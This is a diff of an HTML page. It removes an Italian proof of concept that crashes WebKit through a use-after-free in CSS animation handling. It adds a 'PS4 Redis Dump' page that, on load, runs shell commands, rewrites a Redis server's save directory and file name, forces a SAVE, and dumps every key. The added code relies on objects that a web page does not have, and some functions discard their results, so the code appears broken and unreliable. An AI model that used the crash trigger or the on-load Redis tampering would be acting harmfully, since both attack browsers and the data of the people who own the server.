@@ -1,80 +1,140 @@
 <!DOCTYPE html>
-<html lang="it">
+<html>
 <head>
-    <meta charset="UTF-8" />
-    <title>PoC UAF in CSSAnimation::syncPropertiesWithBackingAnimation</title>
-    <style>
-      
-        @keyframes example {
-            from { opacity: 1; }
-            to { opacity: 0; }
-        }
-
-     
-        cite {
-            display: inline-block;
-           
-            animation: example 1s infinite;
-        }
-
-      
-            border: 1px solid #666;
-            width: 200px;
-            height: 50px;
-            margin: 40px auto;
-            display: block;
-        }
-    </style>
+  <meta charset="utf-8">
+  <title>PS4 Redis Dump</title>
 </head>
-<body onload="startPoC()">
-    <h3 style="text-align:center;">
-        PoC: crash di WebKit in <code>syncPropertiesWithBackingAnimation()</code>
-    </h3>
+<body>
+  <script>
+    var sceNetSocket  = libKernel.sceNetSocket;
+    var sceNetConnect = libKernel.sceNetConnect;
+    var sceNetSend    = libKernel.sceNetSend;
+    var sceNetRecv    = libKernel.sceNetRecv;
+    var sceNetClose   = libKernel.sceNetClose;
+    var inet_addr     = libKernel.inet_addr;
+    var htons         = libKernel.htons;
 
+    var AF_INET      = 2;
+    var SOCK_STREAM  = 1;
+    var IPPROTO_TCP  = 6;
 
-    <object id="obj" type="image/png">
-  
-        <cite id="cited">Testo animato</cite>
-    </object>
-
-    <script>
-    function startPoC() {
-        const obj   = document.getElementById("obj");
-        const cited = document.getElementById("cited");
-
-      
-        obj.addEventListener("DOMSubtreeModified", onSubtreeModified);
-
-   
-        cited.style.animationIterationCount = "infinite";
-
-    
-        setTimeout(() => {
-            obj.data = "nonexistent.png";
-        }, 50);
+    function utf8ToUint8Array(str) {
+      return new TextEncoder().encode(str);
+    }
+    function uint8ArrayToUtf8(arr) {
+      return new TextDecoder("utf-8").decode(new Uint8Array(arr));
     }
 
-    function onSubtreeModified() {
-        const cited = document.getElementById("cited");
-        if (!cited)
-            return;
-
-      
-        const anims = cited.getAnimations();
-        if (anims.length === 0)
-            return;
-
-       
-        cited.style.animationDuration = "2s";
-
-
-        document.getElementById("obj")
-                .removeEventListener("DOMSubtreeModified", onSubtreeModified);
+    function buildRESP(argsArray) {
+      var parts = "*" + argsArray.length + "\r\n";
+      for (var i = 0; i < argsArray.length; i++) {
+        var arg = argsArray[i];
+        parts += "$" + arg.length + "\r\n" + arg + "\r\n";
+      }
+      return parts;
     }
-    </script>
 
-    <p style="text-align:center; color: #f00;">
-        Su WebKit vulnerabile, il browser andrà in crash
-    </p>
+    function sendAndReceive(fd, reqString) {
+      var totalSent = 0;
+      var buf = utf8ToUint8Array(reqString);
+      while (totalSent < buf.length) {
+        var sent = sceNetSend(fd, buf.subarray(totalSent), buf.length - totalSent, 0);
+        if (sent < 0) return;
+        totalSent += sent;
+      }
+      var responseBytes = [];
+      var tmpBuf = new Uint8Array(4096);
+      while (true) {
+        var r = sceNetRecv(fd, tmpBuf, tmpBuf.length, 0);
+        if (r === 0 || r < 0) break;
+        for (var i = 0; i < r; i++) responseBytes.push(tmpBuf[i]);
+        if (r < tmpBuf.length) break;
+      }
+      return uint8ArrayToUtf8(responseBytes);
+    }
+
+    function execShell(cmd) {
+      try { return os.execute(cmd); }
+      catch (e) { return ""; }
+    }
+
+    function startRedisDump() {
+      console.clear();
+      execShell("mkdir -p /data/redis/ 2>/dev/null");
+      var redis_fd = sceNetSocket("redis_client", AF_INET, SOCK_STREAM, IPPROTO_TCP);
+      if (redis_fd < 0) return;
+      var sockaddr = new Uint8Array(16);
+      sockaddr[0] = AF_INET & 0xff;
+      sockaddr[1] = (AF_INET >> 8) & 0xff;
+      var port_be = htons(6379);
+      sockaddr[2] = port_be & 0xff;
+      sockaddr[3] = (port_be >> 8) & 0xff;
+      var ip_be = inet_addr("127.0.0.1");
+      sockaddr[4] = (ip_be >> 24) & 0xff;
+      sockaddr[5] = (ip_be >> 16) & 0xff;
+      sockaddr[6] = (ip_be >> 8) & 0xff;
+      sockaddr[7] = ip_be & 0xff;
+      var ret = sceNetConnect(redis_fd, sockaddr, 16);
+      if (ret < 0) return;
+      var respDir = sendAndReceive(redis_fd, buildRESP(["CONFIG","GET","dir"]));
+      var respDB  = sendAndReceive(redis_fd, buildRESP(["CONFIG","GET","dbfilename"]));
+      function parseConfigValue(respText) {
+        var lines = respText.split("\r\n");
+        for (var i = 0; i < lines.length; i++) {
+          if (!lines[i].match(/^\*[0-9]+/) &&
+              !lines[i].match(/^\$[0-9]+/) &&
+              lines[i] !== "dir" &&
+              lines[i] !== "dbfilename") {
+            return lines[i];
+          }
+        }
+        return null;
+      }
+      var currentDir    = parseConfigValue(respDir);
+      var currentDbfile = parseConfigValue(respDB);
+      var desiredDir    = "/data/redis";
+      var desiredDbfile = "dump.rdb";
+      if (currentDir !== desiredDir) {
+        sendAndReceive(redis_fd, buildRESP(["CONFIG","SET","dir",desiredDir]));
+        currentDir = desiredDir;
+      }
+      if (currentDbfile !== desiredDbfile) {
+        sendAndReceive(redis_fd, buildRESP(["CONFIG","SET","dbfilename",desiredDbfile]));
+        currentDbfile = desiredDbfile;
+      }
+      sendAndReceive(redis_fd, buildRESP(["SAVE"]));
+      function scanOnce(fd, cursor) {
+        var req  = buildRESP(["SCAN", cursor]);
+        var resp = sendAndReceive(fd, req);
+        var lines = resp.split("\r\n");
+        var nextCursor = lines[2];
+        var keys = [];
+        for (var i = 4; i < lines.length; i += 2) {
+          if (lines[i] && !lines[i].match(/^\*(\d+)/) && !lines[i].match(/^\$(\d+)/)) {
+            keys.push(lines[i]);
+          }
+        }
+        return { nextCursor: nextCursor, keys: keys };
+      }
+      function dumpKey(fd, key) {
+        var req  = buildRESP(["DUMP", key]);
+        var resp = sendAndReceive(fd, req);
+        var firstLine = resp.split("\r\n")[0];
+        if (!firstLine.startsWith("$")) return;
+        var byteLen = parseInt(firstLine.slice(1));
+      }
+      var cursor = "0";
+      do {
+        var result = scanOnce(redis_fd, cursor);
+        cursor = result.nextCursor;
+        for (var i = 0; i < result.keys.length; i++) {
+          dumpKey(redis_fd, result.keys[i]);
+        }
+      } while (cursor !== "0");
+      sceNetClose(redis_fd);
+    }
+
+    window.onload = startRedisDump;
+  </script>
 </body>
 </html>
